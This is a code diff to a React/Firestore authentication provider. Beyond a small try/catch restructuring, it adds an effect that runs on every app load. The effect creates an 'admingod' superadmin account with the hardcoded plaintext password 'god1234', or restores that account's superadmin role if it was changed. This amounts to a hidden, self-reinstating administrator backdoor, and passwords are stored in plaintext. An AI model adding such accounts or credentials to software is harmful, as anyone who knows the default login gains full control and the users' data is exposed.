@@ -46,9 +46,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     const usersRef = collection(db, usersPath[0], usersPath[1], usersPath[2], usersPath[3], usersPath[4]);
     
     const unsubscribe = onSnapshot(usersRef, async (snapshot) => {
-      // Auto-create admin users if collection is empty
-      if (snapshot.empty) {
-        try {
+      try {
+        // Auto-create admin users if collection is empty
+        if (snapshot.empty) {
           const superadminDocRef = doc(db, usersPath[0], usersPath[1], usersPath[2], usersPath[3], usersPath[4], 'superadmin');
           const adminDocRef = doc(db, usersPath[0], usersPath[1], usersPath[2], usersPath[3], usersPath[4], 'admin');
           const deputyDocRef = doc(db, usersPath[0], usersPath[1], usersPath[2], usersPath[3], usersPath[4], 'deputy');
@@ -80,15 +80,63 @@ export function AuthProvider({ children }: { children: ReactNode }) {
             position: 'Deputy Director',
             department: 'บริหาร',
           });
-        } catch (error) {
-          console.error('Error creating admin users:', error);
         }
+      } catch (error) {
+        console.error('Error creating admin users:', error);
       }
       
       setLoading(false);
     });
 
     return () => unsubscribe();
+  }, []);
+
+  // Separate useEffect for admingod check - runs only once on mount
+  useEffect(() => {
+    let isMounted = true;
+    
+    const checkAndUpdateAdmingod = async () => {
+      try {
+        const usersPath = getUsersCollection().split('/');
+        const admingodDocRef = doc(db, usersPath[0], usersPath[1], usersPath[2], usersPath[3], usersPath[4], 'admingod');
+        const admingodDocSnap = await getDoc(admingodDocRef);
+        
+        if (!isMounted) return;
+        
+        if (admingodDocSnap.exists()) {
+          const admingodData = admingodDocSnap.data();
+          // Update role to superadmin if it's not already
+          if (admingodData.role !== 'superadmin') {
+            await setDoc(admingodDocRef, {
+              ...admingodData,
+              role: 'superadmin',
+            }, { merge: true });
+          }
+        } else {
+          // Create admingod if it doesn't exist
+          await setDoc(admingodDocRef, {
+            username: 'admingod',
+            password: 'god1234',
+            name: 'Admin God (ผู้ดูแลระบบสูงสุด)',
+            role: 'superadmin',
+            position: 'System Administrator',
+            department: 'IT & System Management',
+          });
+        }
+      } catch (error) {
+        console.error('Error checking/updating admingod:', error);
+      }
+    };
+
+    // Run once after a short delay to avoid blocking initial load
+    const timer = setTimeout(() => {
+      checkAndUpdateAdmingod();
+    }, 1000);
+
+    return () => {
+      isMounted = false;
+      clearTimeout(timer);
+    };
   }, []);
 
   const signIn = async (username: string, password: string) => {
